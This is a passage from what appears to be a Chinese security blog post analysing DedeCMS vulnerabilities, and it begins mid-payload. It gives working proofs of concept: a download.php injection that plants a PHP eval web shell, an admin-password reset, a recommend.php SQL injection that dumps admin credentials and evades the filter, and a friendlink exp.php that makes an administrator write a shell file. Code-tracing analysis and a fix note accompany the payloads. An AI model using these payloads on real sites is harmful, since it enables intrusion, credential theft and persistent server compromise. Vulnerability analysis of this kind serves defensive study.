amp;arrs2[]&#x3D;96&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;96&amp;arrs2[]&#x3D;44&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;123&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;58&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;104&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;125&amp;arrs2[]&#x3D;102&amp;arrs2[]&#x3D;105&amp;arrs2[]&#x3D;108&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;95&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;117&amp;arrs2[]&#x3D;116&amp;arrs2[]&#x3D;95&amp;arrs2[]&#x3D;99&amp;arrs2[]&#x3D;111&amp;arrs2[]&#x3D;110&amp;arrs2[]&#x3D;116&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;110&amp;arrs2[]&#x3D;116&amp;arrs2[]&#x3D;115&amp;arrs2[]&#x3D;40&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;102&amp;arrs2[]&#x3D;108&amp;arrs2[]&#x3D;121&amp;arrs2[]&#x3D;46&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;104&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;44&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;60&amp;arrs2[]&#x3D;63&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;104&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;32&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;118&amp;arrs2[]&#x3D;97&amp;arrs2[]&#x3D;108&amp;arrs2[]&#x3D;40&amp;arrs2[]&#x3D;36&amp;arrs2[]&#x3D;95&amp;arrs2[]&#x3D;80&amp;arrs2[]&#x3D;79&amp;arrs2[]&#x3D;83&amp;arrs2[]&#x3D;84&amp;arrs2[]&#x3D;91&amp;arrs2[]&#x3D;116&amp;arrs2[]&#x3D;121&amp;arrs2[]&#x3D;113&amp;arrs2[]&#x3D;93&amp;arrs2[]&#x3D;41&amp;arrs2[]&#x3D;59&amp;arrs2[]&#x3D;63&amp;arrs2[]&#x3D;62&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;41&amp;arrs2[]&#x3D;59&amp;arrs2[]&#x3D;123&amp;arrs2[]&#x3D;47&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;58&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;104&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;125&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;41&amp;arrs2[]&#x3D;32&amp;arrs2[]&#x3D;35&amp;arrs2[]&#x3D;32&amp;arrs2[]&#x3D;64&amp;arrs2[]&#x3D;96&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;96</span><br></pre></td></tr></table></figure>
+
+<p>他是用<code>dede_mytag</code>这张表生成的文件在<code>plus</code>目录。我们访问一次，<code>dede_mytag</code>就有东西了</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsl2ddzn0sj311f04ddiu.jpg" alt="image-20210716144934935"></p>
+<p>第二步访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;plus&#x2F;mytag_js.php?aid&#x3D;140   &#x2F;&#x2F;注意这个aid就是数据库里面的aid</span><br></pre></td></tr></table></figure>
+
+<p>我们会发现在plus目录下多了一个<code>fly.php</code>这就是我们的后门，密码为tyq。这里就不截图了。</p>
+<p>这里再附上一个更改用户名和密码的POC，一会我们依次分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;plus&#x2F;download.php?open&#x3D;1&amp;arrs1[]&#x3D;99&amp;arrs1[]&#x3D;102&amp;arrs1[]&#x3D;103&amp;arrs1[]&#x3D;95&amp;arrs1[]&#x3D;100&amp;arrs1[]&#x3D;98&amp;arrs1[]&#x3D;112&amp;arrs1[]&#x3D;114&amp;arrs1[]&#x3D;101&amp;arrs1[]&#x3D;102&amp;arrs1[]&#x3D;105&amp;arrs1[]&#x3D;120&amp;arrs2[]&#x3D;97&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;109&amp;arrs2[]&#x3D;105&amp;arrs2[]&#x3D;110&amp;arrs2[]&#x3D;96&amp;arrs2[]&#x3D;32&amp;arrs2[]&#x3D;83&amp;arrs2[]&#x3D;69&amp;arrs2[]&#x3D;84&amp;arrs2[]&#x3D;32&amp;arrs2[]&#x3D;96&amp;arrs2[]&#x3D;117&amp;arrs2[]&#x3D;115&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;114&amp;arrs2[]&#x3D;105&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;96&amp;arrs2[]&#x3D;61&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;115&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;105&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;114&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;44&amp;arrs2[]&#x3D;32&amp;arrs2[]&#x3D;96&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;119&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;96&amp;arrs2[]&#x3D;61&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;102&amp;arrs2[]&#x3D;50&amp;arrs2[]&#x3D;57&amp;arrs2[]&#x3D;55&amp;arrs2[]&#x3D;97&amp;arrs2[]&#x3D;53&amp;arrs2[]&#x3D;55&amp;arrs2[]&#x3D;97&amp;arrs2[]&#x3D;53&amp;arrs2[]&#x3D;97&amp;arrs2[]&#x3D;55&amp;arrs2[]&#x3D;52&amp;arrs2[]&#x3D;51&amp;arrs2[]&#x3D;56&amp;arrs2[]&#x3D;57&amp;arrs2[]&#x3D;52&amp;arrs2[]&#x3D;97&amp;arrs2[]&#x3D;48&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;52&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;32&amp;arrs2[]&#x3D;119&amp;arrs2[]&#x3D;104&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;114&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;32&amp;arrs2[]&#x3D;105&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;61&amp;arrs2[]&#x3D;49&amp;arrs2[]&#x3D;32&amp;arrs2[]&#x3D;35</span><br><span class="line">&#x2F;&#x2F;用户名spider  密码: admin</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们先分析一下更改用户名密码的POC</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gsl2dk7c24j30uj05u43r.jpg" alt="image-20210716145950694"></p>
+<p>可以看到<code>userid</code>和<code>pwd</code>的只，这里<code>pwd</code>为什么是20位是因为<code>cms</code>的原因前三位和后一位是没用的中间的是16位MD5加密</p>
+<p>然后shell POC 是这样子 </p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gsl2donot4j30uk06cwmz.jpg" alt="image-20210716150538028"></p>
+<p>我们现在直接找到<code>download</code>文件分析一下</p>
+<p>首先直接进去12行 看他<code>require_once</code>干了一些什么东西，因为17行有一个<code>$open</code>判断。肯定存在赋值的。</p>
+<p>在<code>include/common.inc.php</code>79行我们又发现了这个代码 存在变量覆盖。</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsl2du51xdj30ud05ldie.jpg" alt="image-20210716175348644"></p>
+<p>经过以上的操作我们<code>$open=1</code>然后跟踪一下$arrs1和2就是一些acsii码值</p>
+<p>一直走到295行，因为上面都是一些安装目录的东西。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$GLOBALS</span>[<span class="string">&#x27;cfg_mysql_type&#x27;</span>] == <span class="string">&#x27;mysqli&#x27;</span> &amp;&amp; function_exists(<span class="string">&quot;mysqli_init&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(DEDEINC.<span class="string">&#x27;/dedesqli.class.php&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(DEDEINC.<span class="string">&#x27;/dedesql.class.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们发现<code>cfg_mysql_type</code> 还发现判断是否有mysqli这个环境，因为这个漏洞点就是在<code>dedesql.class.php</code></p>
+<p><code>dedesqli.class.php</code>是没有这个漏洞点的我们跟进去查看一下做了什么操作</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;arrs1&#x27;</span>]))   <span class="comment">// 直接到589行</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$v2</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="keyword">isset</span>(<span class="variable">$arrs1</span>[<span class="variable">$i</span>]);<span class="variable">$i</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$v1</span> .= chr(<span class="variable">$arrs1</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="keyword">isset</span>(<span class="variable">$arrs2</span>[<span class="variable">$i</span>]);<span class="variable">$i</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$v2</span> .= chr(<span class="variable">$arrs2</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$GLOBALS</span>[<span class="variable">$v1</span>] .= <span class="variable">$v2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后依次对<code>$arrs1</code>和<code>$arrs2</code>解码，如下图</p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gsl2dzm4jej31790h9n7h.jpg" alt="image-20210716180939149"></p>
+<p>然后继续回到download到61行</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsl2e437j0j315i06mgqi.jpg" alt="image-20210716185656621"></p>
+<p>继续跟进去</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsl2e8tkorj315p0cp11c.jpg" alt="image-20210716185841880"></p>
+<p>前面就是一些初始化的东西，跟到254行发现<code>SetQuery</code>然后把<code>$prefix=&quot;#@__&quot;;</code>替换成注入的SQL语句了</p>
+<p>然后我的语句又把后面给注释掉了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE `dede_mytag` (aid,expbody,normbody) VALUES(<span class="number">140</span>,@`<span class="string">&#x27;`,&#x27;</span>&#123;dede:php&#125;file_put_contents(<span class="string">&#x27;&#x27;</span>fly.php<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[tyq]);<span class="meta">?&gt;</span><span class="string">&#x27;&#x27;</span>);&#123;/dede:php&#125;<span class="string">&#x27;) # @`&#x27;</span>`downloads` SET downloads = downloads + <span class="number">1</span> WHERE hash=<span class="string">&#x27;d41d8cd98f00b204e9800998ecf8427e&#x27;</span> </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gsl2eee68hj314y0gu12z.jpg" alt="image-20210716184658064"></p>
+<p>然后返回到<code>dedesql.class.php</code>执行了我们的SQL语句</p>
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gsl2ekfwj9j615w0fx13202.jpg" alt="image-20210716195250544"></p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gsl2ep8rn5j30tu0l17ih.jpg" alt="image-20210716195457995"></p>
+<p>因为我们并没有执行成功所以返回-1赋值给<code>$rs</code></p>
+<p>于是我们进入<code>$dsql-&gt;ExecNoneQuery($query);</code></p>
+<p>同样的方法进入<code>setQuery</code></p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gsl2euc8tqj31650hzn8o.jpg" alt="image-20210716195813065"></p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gsl2eytt96j315s0guail.jpg" alt="image-20210716195927439"></p>
+<p>我们在数据库也可以看到成功插进去了</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gsl2f3r60ij3130045n0g.jpg" alt="image-20210716195950813"></p>
+<p>然后我们为什么访问可以成功落地我们的fly文件呢</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;plus&#x2F;mytag_js.php?aid&#x3D;140</span><br></pre></td></tr></table></figure>
+
+<p>我们去<code>/plus/mytag_js.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$row &#x3D; $pv-&gt;dsql-&gt;GetOne(&quot; SELECT * FROM &#96;#@__mytag&#96; WHERE aid&#x3D;&#39;$aid&#39; &quot;); &#x2F;&#x2F; 23行</span><br></pre></td></tr></table></figure>
+
+<p>把我们的写进去的东西查询出来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">normbody&#x3D;&#123;dede:php&#125;file_put_contents(&#39;fly.php&#39;,&#39;&lt;?php eval($_POST[tyq]);?&gt;&#39;);&#123;&#x2F;dede:php&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后到这里</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$tagbody &#x3D; $row[&#39;normbody&#39;];   &#x2F;&#x2F; 33行赋值给了他</span><br></pre></td></tr></table></figure>
+
+<p>跟踪到45行我们进去</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pv-&gt;SetTemplet($tagbody, &#39;string&#39;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gsl2f9i8nvj31650cxgsp.jpg" alt="image-20210716204211305"></p>
+<p>然后前面就是一些方法赋值之类的，我们直接到149行<code>$this-&gt;ParseTemplet();</code>跟踪进去</p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsl2fg2kvsj313q0ge7cd.jpg" alt="image-20210716204719129"></p>
+<p>跟到<code>MakeOneTag</code>方法然后就是把<code>$dtp</code>赋值给<code>$ctag</code>然后就是一些递归目录下文件我们直接到544行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dtp-&gt;Assign($tagid,$funcname($ctag,$refObj)); &#x2F;&#x2F;544 进去</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$phpcode &#x3D; trim($ctag-&gt;GetInnerText()); &#x2F;&#x2F; 而GetInnerText就是获取$ctag中InnerText的值</span><br></pre></td></tr></table></figure>
+
+<p>然后通过eval去执行这个函数，文件就落地了。</p>
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gsl2flmd1rj312k0fhwoq.jpg" alt="image-20210716210555944"></p>
+<h1 id="DedeCMS-recommend文件SQL注入漏洞"><a href="#DedeCMS-recommend文件SQL注入漏洞" class="headerlink" title="DedeCMS recommend文件SQL注入漏洞"></a>DedeCMS recommend文件SQL注入漏洞</h1><p>条件：</p>
+<blockquote>
+<p>20140201之前版本通杀SQL注入  // 版本查看/data/admin/ver.txt</p>
+</blockquote>
+<h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;plus&#x2F;recommend.php?action&#x3D;&amp;aid&#x3D;1&amp;_FILES[type][tmp_name]&#x3D;\&#39; or mid&#x3D;@&#96;\&#39;&#96; &#x2F;*!50000union*&#x2F;&#x2F;*!50000select*&#x2F;1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd)+from+&#96;%23@__admin&#96; limit+0,1),5,6,7,8,9%23@&#96;\&#39;&#96;+&amp;_FILES[type][name]&#x3D;1.jpg&amp;_FILES[type][type]&#x3D;application&#x2F;octet-stream&amp;_FILES[type][size]&#x3D;111</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsl2fqtm8vj30xi09idht.jpg" alt="image-20210716215638903"></p>
+<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>大致整体看一下代码，代码量很少。我们也可以跟着流程走一遍再分析代码。</p>
+<p>我们这里直接一步步跟吧，因为代码量很少看一下<code>require_once</code>干了些什么事情</p>
+<p>直接进入12行<code>/../include/common.inc.php</code>就是这个文件</p>
+<p>前面就是定义的一些函数，直接跟到79行就是开始赋值</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsl2fvrxoqj30z709otc8.jpg" alt="image-20210717121806322"></p>
+<p>然后调用函数addslashes进行转义把我们的<code>\&#39;</code>=&gt;<code>\\\&#39;</code>而我们POC为什么写<code>\&#39;</code>是有原因的。继续分析。</p>
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gsl2g0c67fj312c0lhaid.jpg" alt="image-20210717121758396"></p>
+<p>然后跟踪到118行<code> require_once(DEDEINC.&#39;/uploadsafe.inc.php&#39;);</code>文件，因为每个东西基本都有注释，他注释也说了</p>
+<p><code>//转换上传的文件相关的变量及安全处理、并引用前台通用的上传函数</code></p>
+<p>所以我们嗯进去看一下 //关键的来了</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsl2g8z0ybj319l0jm4db.jpg" alt="image-20210717122851354"></p>
+<p>他把<code>\\</code>=&gt;<code>\</code>并且赋值给了<code>$type</code> 而<code>$type</code>就是我们后面拼接SQL语句用的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$type&#x3D;\\&#39; or mid&#x3D;@&#96;\\&#39;&#96; &#x2F;*!50000union*&#x2F;&#x2F;*!50000select*&#x2F;1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd) from &#96;#@__admin&#96; limit 0,1),5,6,7,8,9#@&#96;\\&#39;&#96; </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsl2gdr1uyj317l0l2k3v.jpg" alt="image-20210717123514280"></p>
+<p>然后我们回到recommend文件中</p>
+<p>直接跟踪到39行GetOne</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$arcRow&#x3D;$dsql-&gt;GetOne(&quot;SELECT s.*,t.* FROM &#96;#@__member_stow&#96; AS s LEFT JOIN &#96;#@__member_stowtype&#96; AS t ON s.type&#x3D;t.stowname WHERE s.aid&#x3D;&#39;$aid&#39; AND s.type&#x3D;&#39;$type&#39;&quot;);   </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gsl2gid0uyj319p07paec.jpg" alt="image-20210717124407614"></p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsl2gmstyyj31ac0gk478.jpg" alt="image-20210717124522197"></p>
+<p>然后直接到386行，检查SQL语句</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsl2gr97jij314g0hc43u.jpg" alt="image-20210717124327813"></p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsl2gwjjpsj317h0gt7gj.jpg" alt="image-20210717124119260"></p>
+<p>一个正则，所以我们的SQL语句需要写<code>/*!50000union*//*!50000select*/</code>就是为了绕过正则</p>
+<p>第二次SQL注入检测。主要在第626行的While循环中，将所有单引号之间的字符串全部替换成<code>$s$</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//完整的SQL检查</span></span><br><span class="line">       <span class="keyword">while</span> (<span class="literal">TRUE</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="variable">$pos</span> = strpos(<span class="variable">$db_string</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="variable">$pos</span> + <span class="number">1</span>);</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$pos</span> === <span class="literal">FALSE</span>)</span><br><span class="line">           &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="variable">$clean</span> .= substr(<span class="variable">$db_string</span>, <span class="variable">$old_pos</span>, <span class="variable">$pos</span> - <span class="variable">$old_pos</span>);</span><br><span class="line">           <span class="keyword">while</span> (<span class="literal">TRUE</span>)</span><br><span class="line">           &#123;</span><br><span class="line">                <span class="variable">$pos1</span> = strpos(<span class="variable">$db_string</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="variable">$pos</span> + <span class="number">1</span>);</span><br><span class="line">                <span class="variable">$pos2</span> = strpos(<span class="variable">$db_string</span>,<span class="string">&#x27;\\&#x27;</span>, <span class="variable">$pos</span> + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$pos1</span> === <span class="literal">FALSE</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">elseif</span> (<span class="variable">$pos2</span> == <span class="literal">FALSE</span> || <span class="variable">$pos2</span>&gt; <span class="variable">$pos1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$pos</span> = <span class="variable">$pos1</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$pos</span> = <span class="variable">$pos2</span> + <span class="number">1</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="variable">$clean</span> .= <span class="string">&#x27;$s$&#x27;</span>;</span><br><span class="line">           <span class="variable">$old_pos</span> = <span class="variable">$pos</span> + <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="variable">$clean</span> .= substr(<span class="variable">$db_string</span>, <span class="variable">$old_pos</span>);</span><br><span class="line">       <span class="variable">$clean</span> = trim(strtolower(preg_replace(<span class="keyword">array</span>(<span class="string">&#x27;~\s+~s&#x27;</span> ), <span class="keyword">array</span>(<span class="string">&#x27; &#x27;</span>),<span class="variable">$clean</span>)));</span><br></pre></td></tr></table></figure>
+
+<p>经过此次过滤后，SQL语句变成（注意被替换掉的部分）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select s.*,t.* from &#96;dede_member_stow&#96; as sleft join &#96;dede_member_stowtype&#96; as t on s.type&#x3D;t.stowname where s.aid&#x3D;$s$ ands.type&#x3D;$s$ or mid&#x3D;@&#96;\\$s$&#96; $s$</span><br></pre></td></tr></table></figure>
+
+<p>紧接下来是另一次的union|sleep|benchmark|load_file|outfile等关键字检测，此时的正则规则更严格，但union,select等关键字已被替换成<code>$s$</code>，因此不会触发正则</p>
+<p>执行成功后返回数据给前台显示。</p>
+<p>前面写的有点乱，我们整理一下思路吧。</p>
+<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gsl2h2bktuj30vg0i5tot.jpg" alt="image-20210717152110558"></p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>根据官方发布的漏洞补丁，主要修改文件include/uploadsafe.inc.php中第29行</p>
+<p>（上面为修复前，下面为修复后）：</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsl2h7eq5aj30qu01q3ze.jpg" alt="image-20210717152502696"></p>
+<h1 id="DedeCMS-友情链接申请-Getshell"><a href="#DedeCMS-友情链接申请-Getshell" class="headerlink" title="DedeCMS 友情链接申请 Getshell"></a>DedeCMS 友情链接申请 Getshell</h1><h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>条件：</p>
+<blockquote>
+<p>版本&lt;20170330</p>
+</blockquote>
+<p>准备一个链接下面放一个exp.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//print_r($_SERVER);</span></span><br><span class="line"><span class="variable">$referer</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$dede_login</span> = str_replace(<span class="string">&quot;friendlink_main.php&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$referer</span>);<span class="comment">//去掉friendlink_main.php，取得dede后台的路径</span></span><br><span class="line"><span class="comment">//拼接 exp</span></span><br><span class="line"><span class="variable">$muma</span> = <span class="string">&#x27;&lt;&#x27;</span>.<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;p&#x27;</span>.<span class="string">&#x27;h&#x27;</span>.<span class="string">&#x27;p&#x27;</span>.<span class="string">&#x27; &#x27;</span>.<span class="string">&#x27;P&#x27;</span>.<span class="string">&#x27;h&#x27;</span>.<span class="string">&#x27;p&#x27;</span> .<span class="string">&#x27;i&#x27;</span>.<span class="string">&#x27;n&#x27;</span>.<span class="string">&#x27;f&#x27;</span>.<span class="string">&#x27;o&#x27;</span>.<span class="string">&#x27;(&#x27;</span>.<span class="string">&#x27;)&#x27;</span>.<span class="string">&#x27;;&#x27;</span>.<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$exp</span> = <span class="string">&#x27;tpl.php?action=savetagfile&amp;content=&#x27;</span>. <span class="variable">$muma</span> .<span class="string">&#x27;&amp;filename=shellxxxxxx.lib.php&#x27;</span>;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$dede_login</span>.<span class="variable">$exp</span>;</span><br><span class="line"><span class="comment">//echo $url;</span></span><br><span class="line">header(<span class="string">&quot;location: &quot;</span>.<span class="variable">$url</span>);</span><br><span class="line"><span class="comment">// send mail coder</span></span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后去申请友情链接</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsl2hclaymj30zc0gidk9.jpg" alt="image-20210717155145039"></p>
+<p>去后台查看</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsl2hgu4ktj316n07cgnb.jpg" alt="image-20210717154236492"></p>
+<p>点击友情链接名称</p>
+<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gsl2hlxta8j317909jn02.jpg" alt="image-20210717155233779"></p>
+<p>然后发现在我们的目录下面已经成功生成了</p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsl2hqdr1uj30og0e6dnp.jpg" alt="image-20210717154407704"></p>
+<p>我们直接去访问</p>
